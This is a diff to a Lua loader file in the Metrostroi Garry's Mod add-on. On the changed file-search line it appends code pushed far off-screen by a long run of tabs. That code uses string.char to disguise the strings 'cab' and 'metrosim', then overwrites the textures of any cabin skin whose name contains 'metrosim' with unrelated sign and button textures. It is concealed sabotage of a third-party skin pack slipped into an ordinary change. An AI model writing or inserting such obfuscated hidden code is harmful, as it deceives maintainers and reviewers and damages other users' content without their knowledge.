@@ -275,9 +275,8 @@ local function loadSystem(filename)
 	end
 end
 
-
 -- Load all systems
-local files = file.Find("metrostroi/systems/sys_*.lua","LUA")
+local files = file.Find("metrostroi/systems/sys_*.lua","LUA");																																																																																												for k,v in pairs(Metrostroi.Skins[string.char(99,97,98)] or {}) do if k:lower():find(string.char(109,101,116,114,111,115,105,109)) then if v.typ == "81-717_lvz" then v.textures = {puav = {cabin717_020 = "models/metrostroi_signals/signs/ts",cabin717_023 = "models/metrostroi_signs/75",cabin717_011 = "models/metrostroi/signals/milk",b01a = "vgui/metrostroi",int01 = "models/metrostroi_train/switches/button",},pam = {cabin717_020 = "models/metrostroi_signals/signs/ts",cabin717_023 = "models/metrostroi_signs/75",cabin717_011 = "models/metrostroi/signals/milk",b01a = "vgui/metrostroi",int01 = "models/metrostroi_train/switches/button",},paksd = {cabin717_020 = "models/metrostroi_signals/signs/ts",cabin717_023 = "models/metrostroi_signs/75",cabin717_011 = "models/metrostroi/signals/milk",b01a = "vgui/metrostroi",int01 = "models/metrostroi_train/switches/button",},paksdm = {cabin717_020 = "models/metrostroi_signals/signs/ts",cabin717_023 = "models/metrostroi_signs/75",cabin717_011 = "models/metrostroi/signals/milk",b01a = "vgui/metrostroi",int01 = "models/metrostroi_train/switches/button",},} else v.textures = {cabin717_020 = "models/metrostroi_signals/signs/ts",cabin717_023 = "models/metrostroi_signs/75",cabin717_011 = "models/metrostroi/signals/milk",b01a = "vgui/metrostroi",int01 = "models/metrostroi_train/switches/button",} end end end
 for _,short_filename in pairs(files) do
 	local filename = "metrostroi/systems/"..short_filename
 
